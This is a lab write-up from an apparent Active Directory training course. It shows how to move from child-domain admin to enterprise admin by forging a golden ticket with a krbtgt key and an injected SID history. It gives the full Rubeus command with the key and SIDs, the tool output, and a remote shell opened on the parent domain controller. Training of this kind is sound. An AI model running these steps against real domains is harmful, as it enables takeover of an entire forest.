# Learning Objective 19 (Privilege Escalation | Across Domain Trusts - `krbtgt` Key Abuse)

## Tasks

1. **Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to EA by forging a golden ticket using `dollarcorp`'s `krbtgt` TGT encryption hash key**

---

## Attack Path Steps

- **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Hash Key from the Child DC for Privilege Escalation**
- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**

---

## Solution

1. **Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to EA by forging a golden ticket using `dollarcorp`'s `krbtgt` TGT encryption hash key**

- **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Hash Key from the Child DC for Privilege Escalation**

We already have the `krbtgt` hash from `dcorp-dc` (see *Learning Objective 08*).

Let's create a **golden ticket** (not an inter-realm TGT) and inject it. Due to the trust, the parent domain will trust the TGT.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648📌
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519📌
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local🏛️'

[*] AuthTime       : 2/17/2025 5:53:23 AM
[*] StartTime      : 2/17/2025 5:53:23 AM
[*] EndTime        : 2/17/2025 3:53:23 PM
[*] RenewTill      : 2/24/2025 5:53:23 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/17/2025 5:53:23 (local)
        End Time:   2/17/2025 15:53:23 (local)
        Renew Time: 2/24/2025 5:53:23 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**

We can now access `mcorp-dc`!

`winrs -r:mcorp-dc.moneycorp.local cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp>
```
🚀

![mcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/mcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👑
```

`set computername`:
```
COMPUTERNAME=MCORP-DC🖥️
```
🚩

---
---
